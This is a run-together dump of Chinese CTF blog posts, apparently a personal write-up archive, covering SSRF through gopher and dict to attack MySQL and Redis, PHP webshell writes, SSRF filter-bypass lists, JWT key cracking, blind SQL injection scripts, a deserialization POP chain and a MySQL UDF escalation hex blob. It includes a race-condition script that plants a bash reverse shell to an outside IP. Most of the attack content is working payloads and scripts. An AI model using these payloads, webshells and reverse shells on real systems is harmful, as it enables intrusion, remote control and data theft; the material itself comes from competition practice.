mysql客户端与服务器的交互过程mysql客户端与服务器的交互主要分为两个阶段:connection phase（连接阶段或者叫认证阶段）command phase(命令阶段)在连接阶段包括我首保和认证包，主要关注认证数据包 构造攻击数据包1.使用tcpdump tcpdump -ilo0 port 3306 -w sql.pcapng 2.使用wireshark打开存储了数据包的文件3.接下来找到Login Request的包并右键单击Follow一下里面的TCP Stream4.执行以下操作 5.将上面的数据复制下来，使用一下脚本，构造gopher攻击包： #encoding:utf-8import sysdef result(s): a=[s[i:i+2] for iin range(0,len(s),2)] return &quot;curl gopher://127.0.0.1:3306/_%&quot; + &quot;%&quot;.join(a)s='''十六进制数据流放在这里'''.replace('\\n', '')print(result(s)+'--output -') 6.运行脚本 ，执行脚本结果 GET SHELL利用mysql写马： select '&lt;?php phpinfo(); ?&gt;' into out file &quot;/tmp/1.php&quot;; 然后使用gopher伪造，然后打过去PS：如果题目权限给的很高，或者用了比较旧的mysql版本，说明就是要让你用这个办法，否则你写过去的马将会面临一个权限问题 如果没有写入权限为null，那么就是用log写马即可 SSRF攻击RedisRedis通信方式gopher发送redis请求用以下脚本直接打，可替换内容，然后再urlencode一下即可 from urllib.parseimport quote as urlencodedefgopher(): stream = f&quot;&quot;&quot;*2$4auth$6123123*2$3get$4name&quot;&quot;&quot;.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;) g = &quot;gopher://127.0.0.1:8000/_&quot; + urlencode(stream) return gprint(&quot;curl &quot;+gopher()) 备份crontab反弹shellcentos才能用 备份文件写马如果redis与php在一起，可以直接写到/var/www/html/shell.php def webshell():s='''auth 123123set mars &quot;&lt;?php eval($_POST[0]);?&gt;&quot;config set dir /tmp/config set dbfilename shell.phpsavequit''' print(urlencode(gopher(s))) DICT://的利用爆破端口url=dict://127.0.0.1:8000 通过回显看端口是否开启 爆破密码url=dict://127.0.0.1:8000/auth;123123(密码) 通过回显看密码，密码一般是123456或者admin或者123123 备份文件写马dict://127.0.0.1:8001/config:set:dbfilename:webshell.phpdict://127.0.0.1:8001/config:set:dir:/tmpdict://127.0.0.1:8001/set:webshell:&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f\\x28\\x29\\x3b\\x20\\x3f\\x3e&quot; 主从复制RCE使用两个工具： https://github.com/n0b0dyCN/redis-rogue-serverhttps://github.com/Ridter/redis-rce 使用redis-rce加载redis-rogue-server-master的恶意模块exp.so，即可实现RCE 写无损文件https://github.com/r35tart/RedisWriteFile 使用此软件联通即可写无损文件 SSRF Trick绕过访问限制对访问的限制file协议+域名+读文件地址 file://localhost/var/www/html/config.php 1.过滤file，可使用File://大小写绕过试试2.提交内容末尾添加/等内容可使用?或者#进行注释3.url可以加参数绕过过滤 对本地的访问限制/对访问协议的限制跳转/解析到127.0.0.1：http://127.0.0.1.nip.io/flag.php编码绕过：进制转换http://0x7f.0.0.1/flag.php特殊字符绕过http://①②⑦.⓪.⓪.①/flag.phphttp://[0:0:0:0:0:ffff:127.0.0.1]/flag.phphttp://127。0。0。1/flag.phphttp://127.1/flag.phphttp://[::]:80/flag.phphttp://127.0.0.1./flag.php 遇到需要127.0.0.1访问：直接使用以下内容进行绕过 X-Forwarded-For:127.0.0.1X-Forwarded:127.0.0.1Forwarded-For:127.0.0.1Forwarded:127.0.0.1X-Forwarded-Host:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1Ali-CDN-Real-IP:127.0.0.1Cdn-Src-Ip:127.0.0.1Cdn-Real-Ip:127.0.0.1CF-Connecting-IP:127.0.0.1X-Cluster-Client-IP:127.0.0.1WL-Proxy-Client-IP:127.0.0.1Proxy-Client-IP:127.0.0.1Fastly-Client-Ip:127.0.0.1True-Client-Ip:127.0.0.1 进制的转换可以使用一些不同的进制替代ip地址，从而绕过WAF 利用DNS解析如果你自己有域名的话，可以在域名上设置A记录，指向127.0.0.1。 利用@绕过http://www.baidu.com@127.0.0.1与http://127.0.0.1请求是相同的 file_get_contents()中的trick有关file_get_contents()函数的一个trick，可以看作是SSRF的一个黑魔法，当PHP的 file_get_contents()函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。 httpsssss://../../../../../../etc/passwd https://www.freebuf.com/articles/network/255456.html PHP parse_url()漏洞产生原因： Parse_url和访问url是两件事，这两件事对url的处理存在差异 漏洞利用： http://y1ng.vip\\@flag.authenticator.das.ctf:80/则会访问到flag.authenticator.das.ctf:80/ Apache SSRF任意读取：https://github.com/ev0A/ArbitraryFileReadList/ 读配置文件，发现其他端口 无gopher和dict如何ssrf使用soap反序列化可以发送post请求 &lt;?php$target = 'http://123.206.216.198/bbb.php';$post_string = 'a=b&amp;flag=aaa';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: xxxx=1234' );$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri' =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace('^^','%0d%0a',$aaa);$aaa = str_replace('&amp;','%26',$aaa);echo $aaa;?&gt; DNS重绑定验证和访问分开，验证一个合法的域名，然后在这个域名写写一个重定向的指令可以重定向的域名生成： https://requestrepo.com/#/https://lock.cmpxchg8b.com/rebinder.html CTF中的内网渗透flag一般不在拿shell的这个机器上如果是有一个共同上传的地方，意味着upload目录下是一个777的权限，可以直接去扫获取别队伍上传的信息对于打内网：通过ifconfig看ip地址（windows）通过/etc/hosts首先扫描ip看是否有存活主机，再将所有存活主机ip列出来，HTTP服务-&gt;扫服务（端口） 扫描工具：masscan nmap goby等工具 getshell以后发现权限不够，可以使用ps（获取进程，看看运行了什么进程）或者开netstat自己再80端口，然后shell在8006端口该如何解决？frp工具：","link":"/2021/08/31/ssrf%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"title":"刷题记录","text":"1127可以看源码，所以直接查看源码 if (req.session.won &gt;= 100) { console.log(&quot;you won&quot;) const token = jwt.sign ( { id : req.session.want_to_eat, is_win : &quot;true&quot; }, env.parsed.rockyou, { expiresIn: 3600 * 12 } ) res.cookie(&quot;token&quot;, token, { maxAge: 3600 * 12, httpOnly: true }); req.session.is_win = &quot;true&quot; res.redirect(&quot;/award&quot;) return } // 如果圣诞老人赢了5次那么你就输了 if ( req.session.santa &gt; 5 ) { req.session.destroy() res.render(&quot;failed&quot;) return; } 赢100次就胜利，显然不太可能，于是继续看看其他地方，这里发现session可以被player的属性赋值，那么如果我们将player这里就对won属性赋值&gt;100不就可以了吗，初步推断可能存在原型链污染之类 app.get('/start', (req, res)=&gt;{ if ( player.name ) { for (let i in player) { if (req.session.hasOwnProperty(i)) req.session[i] = player[i] else { res.end(&quot;Do you think i am stupid?&quot;) player = {} req.session.destroy() return } } 但是在另一个地方：发现有对won的重新赋值，所以应该还要再考虑一下原型链污染的一个顺序问题 app.post('/start', (req, res)=&gt;{ if ( !req.cookies.token || !req.session.name ) { res.status(403).send(&quot;you are not allowed to visit this page&quot;) return } if ( !req.session.won ) req.session.won = 0 if ( !req.session.santa ) req.session.santa = 0 最后再POST /这个路由中看到，果然有可以污染的地方 player[i] = tempPlayer[i] 捋一下思路：先对POST /污染一下player ——&gt;到POST /start 初始化session——&gt;GET /start 对session进行赋值，将其won属性赋值给session但是我又看了一下似乎这样还是不够的,/award中还有一个is_win要是true，这样 if (req.user.is_win !== 'true' || req.session.is_win !== 'true' ) 向上看了一下，POST /start中有对这一项进行ture的赋值，所以应该还要再回来post /start中对这个进行赋值 首先把post污染一下那个won属性，然后把token复制回去替换一下去访问就可以发现player已经101分了 然后就有token让你跳转到/award 然后无事发生？、? 回去看看源码，这边似乎要注入，但是我不知道id在哪，感觉是要伪造jwt于是再看看== let patt = /union|like|pragma|savepoint|vacuum|detach|alter|attach|insert|update|release|rollback|load|create|drop|delete|explain|regexp|=|&gt;|&lt;|&quot;|'/i if ( req.user.id.match(patt) ) { res.status(403).end(&quot;Never Trust Your User&quot;) return } db.get(`SELECT ITEM,LOG FROM AWARD WHERE id=${req.user.id}`,function(err,row){ if (!row) { res.render(&quot;reward&quot;, {&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;}) return } if (row[&quot;ITEM&quot;] &amp;&amp; row[&quot;LOG&quot;]){ res.render(&quot;reward&quot;, {&quot;award&quot;: row[&quot;ITEM&quot;], &quot;message&quot; : row[&quot;LOG&quot;]} ) } else res.render(&quot;reward&quot;, {&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;}) })}) 用工具发现出不来，于是在回去找找信息：发现是要用rockyou的字典才行 import jwtjwt_str = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot;path = &quot;C:/Users/10452/Desktop/rockyou.txt&quot;alg = &quot;HS256&quot;with open(path,encoding='utf-8') as f: for line in f: key_ = line.strip() try: jwt.decode(jwt_str,verify=True,key=key_,algorithms=[&quot;HS256&quot;]) print('found key! --&gt; ' + key_) break except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): print('found key! --&gt; ' + key_) break except(jwt.exceptions.InvalidSignatureError): continue else: print(&quot;key not found!&quot;) 拿到key然后去换一下user看看源码这个看起来就是要盲注了吧 应该就是要用这个id来进行盲注了吧 那么接下来的思路就是构造sql注入语句，然后替换到id那边重新进行加密，但是每次要到这个/award都需要重新构造id，就要伪造jwt，这里就编写一下python脚本跑一下？首先看看如何构造盲注语句：根据他的结果，如果查询到就返回结果，查询不到就返回空好像，然后根据这个过滤内容，看起来不像是mysql，毕竟mysql没有vacuum这个东西吧，查了一下，这个是sqlite的东西，所以这题应该是sqlite盲注盲注中的截取没咋过滤，就直接用substr就可以，然后比较符过滤了，很多，看了一下in没被过滤，所以这里考虑用in试试,由于引号都被过滤了，所以可以直接使用char函数进行绕过 import jwtimport requestsimport stringurl=&quot;http://a.y1ng.vip:1127/&quot;s=requests.session()game=&quot;s%3AAUHzfM13c2l68I75rIKMDLtiU8GKtpxJ.H3ugRxCwtqH1Ey6%2F1IClRNwrt8Ba5uE0FSihnsXd2kE&quot;def jwt_boom(): jwt_str = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot; path = &quot;C:/Users/10452/Desktop/rockyou.txt&quot; with open(path,encoding='utf-8') as f: for line in f: key_ = line.strip() try: jwt.decode(jwt_str,verify=True,key=key_,algorithms=[&quot;HS256&quot;]) print('found key! --&gt; ' + key_) break except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): print('found key! --&gt; ' + key_) break except(jwt.exceptions.InvalidSignatureError): continue else: print(&quot;key not found!&quot;)def jwt_encode(payload_t): json = { &quot;id&quot;: payload_t, &quot;is_win&quot;: &quot;true&quot;, &quot;iat&quot;: 1630654737, &quot;exp&quot;: 1630697937 } token = jwt.encode(json, &quot;fuckoff123&quot;, algorithm='HS256') return tokendef ord_tran(s): fin=&quot;&quot; for i in s: fin +=f&quot;{ord(i)},&quot; #print(f&quot;chr({fin[:-1]})&quot;) return f&quot;char({fin[:-1]})&quot;def sql_injection(payload): result=&quot;&quot; for i in range(1,10000): for j in range(0,128): payload_f=f&quot;1 and char({j}) in (substr(({payload}),{i},1));--&quot; #print(payload_f) token=jwt_encode(payload_f) headers={ &quot;cookie&quot;:f&quot;game={game}; token={token}&quot; } #print(headers) r=s.get(url=url+'award',headers=headers).text #print(r) if &quot;Turkey&quot; in r: result += chr(j) print(result) breakif __name__ == &quot;__main__&quot;: #jwt_boom() #key=fuckoff123 #payload=&quot;SELECT group_concat(name) FROM sqlite_master&quot;#AWARD,sqlite_autoindex_AWARD_1,SECRET,sqlite_autoindex_SECRET_1 #ord_tran(&quot;SECRET&quot;) #payload=f&quot;SELECT group_concat(sql) FROM sqlite_master WHERE tbl_name in ({ord_tran('SECRET')})&quot;#fl4ggg payload=f&quot;SELECT group_concat(fl4ggg) FROM SECRET&quot;#almost,flag{f7f0f684-0abf-ffe1-c561-a186d17a0b1d} sql_injection(payload) sqlite注入：https://xz.aliyun.com/t/8627#toc-3 2023一开始我输入任何的url都没用，一直说后缀不对，原来是要在url后面加一个png。。。。所以可以用file协议读一下源码，由于过滤了var，可以通过二次url编码进行绕过，为什么用?号呢。其实这里可以理解为一个分割的作用吧，?png不影响前面地址的访问 file:///%25%37%36ar/www/html/index.php?png &lt;?phperror_reporting(0);if(isset($_GET['url'])){ $url = $_GET['url']; if(preg_match(&quot;/flag|apache|conf|var|proc|log/i&quot; ,$url)){ $dieMess = &quot;Dangerous content.&quot;; } else{ $end = substr($url, strlen($url) - 3, strlen($url)); if($end === &quot;png&quot;){ $curlobj = curl_init($url); curl_setopt($curlobj, CURLOPT_TIMEOUT, 200); curl_setopt($curlobj, CURLOPT_URL, $url); curl_setopt($curlobj, CURLOPT_HEADER, 0); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($curlobj); if(ord($res) &lt; 0x80){ $dieMess = $res; } $httpCode = curl_getinfo($curlobj, CURLINFO_HTTP_CODE); var_dump($httpCode); if($httpCode &lt; 300){ $down = curl_init($url); $tmpFile = tempnam(sys_get_temp_dir(), 'image'); $resource = fopen($tmpFile, 'wb'); curl_setopt($down, CURLOPT_FILE, $resource); curl_setopt($down, CURLOPT_TIMEOUT, 200); curl_setopt($down, CURLOPT_URL, $url); curl_setopt($down, CURLOPT_HEADER, 0); curl_exec($down); $filename = &quot;./you_will_never_find_me_hiahiahia_and_my_duty_is_storage_tmp_file/&quot; . md5(time()) . &quot;.png&quot;; copy($tmpFile, $filename); @unlink($tmpFile); if($dieMess == &quot;&quot;) $dieMess = &quot;Your picture's colorful number is &quot; . getMainColor($filename, '1') . &quot;.&quot;; @unlink($filename); } else{ $dieMess = &quot;Woops, seem I can not visit it!&quot;; } } else{ $dieMess = &quot;Extension not allowed!&quot;; } }} 所以应该是将tmpfile文件的内容赋值给filename中，然后访问即可，接下来就是找flag在哪里，可以猜一下是否在/flag或者/flag.txt~ 1115扫描一下 发现有source目录 require 'sinatra'require 'base64'require 'safe_regexp'FLAG = File.open('/flag', &quot;r&quot;).read # 是一个MD5，提交时请包裹上flag{}String.class_eval do def text return [self].pack('H*') endendset :public_folder, File.dirname(__FILE__) + '/static'get '/' do File.open('/app/app/index.html' , &quot;r&quot;).readendget '/check/:regex' do begin regexp = Regexp.new(params['regex'].text) p regexp rescue &quot;False!&quot; return end begin SafeRegexp.execute(regexp, :match?, FLAG, timeout: 3) &quot;OK!&quot; rescue &quot;False!&quot; endendget '/source' do File.open(__FILE__ , &quot;r&quot;).readend 这题是正则表达式延时，直接打就行了~ require 'net/http'CHALLENGE = 'http://a.y1ng.vip:1115'String.class_eval do def hex res = '' self.each_byte do |i| res += &quot;%02x&quot; % i end return res endenddef random(len) chars = (&quot;a&quot;..&quot;z&quot;).to_a + (&quot;A&quot;..&quot;Z&quot;).to_a + (&quot;0&quot;..&quot;9&quot;).to_a s = &quot;&quot; 1.upto(len) do s &lt;&lt; chars[rand(chars.size - 1)] end senddef check_result(reg, suffix) full_regexp = &quot;^(?=&quot; + reg + &quot;)((.*)*)*&quot; + suffix p full_regexp uri = URI(CHALLENGE + 'check/' + full_regexp.hex) Net::HTTP.get_response(uri)enddef leak(flag, r) chars = '0123456789abcdef' (0..15).each do |i| if check_result(flag + chars[i], r).body[&quot;False&quot;] p flag + chars[i] return leak(flag + chars[i], r) end endendr = random(10)+'$'leak('', r) 2014上面存在文件包含:使用一下指令读取源码 ?page=php://filter/convert.iconv.ASCII.UCS-2BE/resource=login.php?page=php://filter/convert.iconv.ASCII.UCS-2BE/resource=index.php 得到以下内容: &lt;?php error_reporting(0); if (isset($_GET['d3bug'])) { phpinfo(); } if (isset($_GET['page'])) { $page = $_GET['page']; $filter = &quot;/\\.\\.|base|file|gopher|http|ftp|phar|base|string|data|zip|compress|base|decode|read|pear|rot|crypt|pear|utf|flag/i&quot;; if (preg_match( $filter , $page) ) { die(&quot;hacker&quot;); } include $page; }else{ echo &quot;&lt;script&gt;location.href='./?page=login.php'&lt;/script&gt;&quot;; } 然后看到phpinfo()里面，可以使用session文件包含，因为PHP_SESSION_UPLOAD_PROGRESS是有开的 import requestsimport threadingsess_id=&quot;tlife&quot;s=requests.session()url=&quot;http://&quot;def session_upload(): while True: res= s.post( url=f&quot;{url}/?page=/tmp/session/sess_{sess_id}&quot;, data={ 'PHP_SESSION_UPLOAD_PROGRESS': &quot;&lt;?=`bash -c 'bash -i &gt;&amp; /dev/tcp/110.42.133.120/9999 0&gt;&amp;1'`;?&gt;&quot; }, files={&quot;file&quot;: ('xxx.txt', open(&quot;shell.txt&quot;, &quot;r&quot;))}, cookies={'PHPSESSID':sess_id} )for i in range(100): thread=threading.Thread(target=session_upload) thread.start() 就可以了~ 1119看了一下过滤了最重要的info库，就意味着大概率是无列名盲注了，然后过滤了一些比较符号，还有like、rlike等正则匹配函数，那么本题似乎只能用case when了的感觉接下 判断注入类型 布尔盲注，回显分为 测试语句：:root'and/**/case/**/1/**/when/**/1/**/then/**/1/**/else/**/0/**/end#true:welcomt adminfalse:wrong 编写盲注脚本： 构造注入语句 这题的截取函数基本都过滤了，所以这里使用 接下来就是跑表名，由于in库被过滤了，这里试了一下 发现 select group_concat(table_name) from sys.schema_table_statistics; 是可以的 就可以跑出表名了接下来使用union无列名盲注 select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2 得到表名以后 直接select * from SeCrrreT跑不出来，所以可以猜想肯定不止一行，所以后面要加limit 然后用无列名盲注，去尝试字段数 import requestsimport stringurl=&quot;http://a.y1ng.vip:1119/&quot;s=requests.session()def sql_injection(payload): data1=&quot;&quot; for i in range(1,100): for j in range(32,128): payload_tr=f&quot;root'and case ascii(reverse(left(({payload}),{i}))) when {j} then 1 else 0 end#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ &quot;username&quot;:payload_tr, &quot;password&quot;:&quot;1141&quot; } r=s.post(url=url,data=data).text #print(r) #print(data) if &quot;Welcome Admin!&quot; in r: data1+=chr(j) print(data1) breakif __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctfgame #payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;#users,SeCrrreT payload=&quot;select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2&quot;#flag{fab99a66-23db-47b1-9db4-9262664d76a8} sql_injection(payload)","link":"/2021/08/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"2021工控安全线上初赛","text":"遭到黑客攻击！打开wireshark，发现异常数据发现是莫斯电码，解码以后就可以拿到flag 工控协议分析这题也是赛后才做出来的，和18年的题目很像，看到有write var写入，设置筛选条件： s7comm&amp;&amp;s7comm.param.func==0x05 然后拼凑起来即可","link":"/2021/09/12/2021%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/"},{"title":"buu27","text":"&lt;?phperror_reporting(0);session_save_path(&quot;/var/babyctf/&quot;);session_start();require_once &quot;/flag&quot;;highlight_file(__FILE__);if($_SESSION['username'] ==='admin'){ $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); }}else{ $_SESSION['username'] ='guest';}$direction = filter_input(INPUT_POST, 'direction');$attr = filter_input(INPUT_POST, 'attr');$dir_path = &quot;/var/babyctf/&quot;.$attr;if($attr===&quot;private&quot;){ $dir_path .= &quot;/&quot;.$_SESSION['username'];}if($direction === &quot;upload&quot;){ try{ if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){ throw new RuntimeException('invalid upload'); } $file_path = $dir_path.&quot;/&quot;.$_FILES['up_file']['name']; $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES['up_file']['tmp_name']); if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){ $upload_result = &quot;uploaded&quot;; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $upload_result = $e-&gt;getMessage(); }} elseif ($direction === &quot;download&quot;) { try{ $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.&quot;/&quot;.$filename; if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } if(!file_exists($file_path)) { throw new RuntimeException('file not exist'); } header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=&quot;'.substr($filename, 0, -65).'&quot;'); if(readfile($file_path)){ $download_result = &quot;downloaded&quot;; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $download_result = $e-&gt;getMessage(); } exit;}?&gt; 1.伪造admin的session2.创建一个success.txt伪造admin的sessionn感觉可以先在本地创建一个，然后再传过去：","link":"/2021/09/07/buu27/"},{"title":"羊城杯wp","text":"Only 4有个关键文件serialize.php文件没扫到是真的无语，一直在那里读文件，有个配置文件 ?gwht=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini 读完以后发现session_upload_progress默认是开启的，还提高了session路径，所以就使用条件竞争去上传了，但是不知道为啥，我这里一直反弹shell没成功。。。但是学长们成功了~ 有一个serialize.php文件，预期解说是扫描出来的，这波是真的难受啊，真的没扫出来我吐了，这次复现就决定复现一下这个预期解了读一下serialize.php，可以直接 &lt;?phpclass start_gg { public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call { public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct { public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func { public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;å­ç¬¦ä¸²æ¼æ¥&quot;.$this-&gt;mod1; } }class string1 { public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo highlight_file('secret.php'); }}?&gt; 构造链条 &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct{ public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func{ public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;å­ç¬¦ä¸²æ¼æ¥&quot;.$this-&gt;mod1; }}class string1{ public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo highlight_file('secret.php'); }}$a=new start_gg();$b=new Call();$c=new funct();$d=new func();$e=new string1();$f=new GetFlag();$e-&gt;str1=$f;$d-&gt;mod1=$e;$c-&gt;mod1=$d;$b-&gt;mod1=$c;$a-&gt;mod1=$b;echo urlencode(serialize($a)); 之后就可以看到secret.php的源码，，发现是有字符长度限制的写shell考点，后面还没来得及做，环境就关了。。。。收藏一下别人的脚本 def start_flag(s):global stop_threadswhile True:if stop_threads:breakf = io.BytesIO(b'a' * 1024 * 50)url = 'http://192.168.41.134:8000/?gwht=/var/lib/php5/sess_1&amp;ycb=http://127.0.0.1'headers = {'Cookie': 'PHPSESSID=1', }data = {&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system('cat/flag');echo 'flag';?&gt;&quot;} # Payloadfiles = {&quot;file&quot;: ('1.txt', f)}rest = s.post(url, headers=headers, data=data, files=files)if 'flag' in r.text:print(rest.text)exit()if __name__ == '__main__':with requests.session() as session:while thread_num:thre = threading.Thread(target=run, args=(s,))thre.start()thread_list.append(thre)for t in thread_list:t.join() EasyCurl这里主要记录一下没见过的考点:udf提权首先查看一下插件库的路径: show variables like '%plugin%'; 然后将库文件导入到该目录下 select unhex('7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29